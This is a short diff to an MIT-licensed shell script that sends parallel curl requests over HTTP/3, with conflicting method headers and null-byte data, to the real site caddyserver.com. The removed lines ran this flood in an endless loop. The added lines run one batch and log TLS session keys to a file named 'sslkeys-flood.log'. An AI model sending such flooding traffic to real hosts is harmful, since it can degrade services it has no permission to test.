@@ -4,8 +4,11 @@
 #The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
 #THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 
+SCRIPT_DIR="$(pwd)"
+SSLKEYLOGFILE="$SCRIPT_DIR/sslkeys-flood.log"
+export SSLKEYLOGFILE
+# Notify the user about the location of the SSL key log file
+echo "[*] SSL key log file will be saved at: $SSLKEYLOGFILE"
 
-while true
-do
-   seq 1 10 | xargs -n1 -P10 timeout 1s curl -X GET https://caddyserver.com/ -H "method: HEAD" -H "method: POST" -H "method: GET" -H "settings: 0" --data "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" --http3 -v -o /dev/null
-done
+seq 1 10 | xargs -n1 -P10 timeout 1s curl -X GET https://caddyserver.com/ -H "method: HEAD" -H "method: POST" -H "method: GET" -H "settings: 0" --data "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" --http3 -v -o /dev/null
+
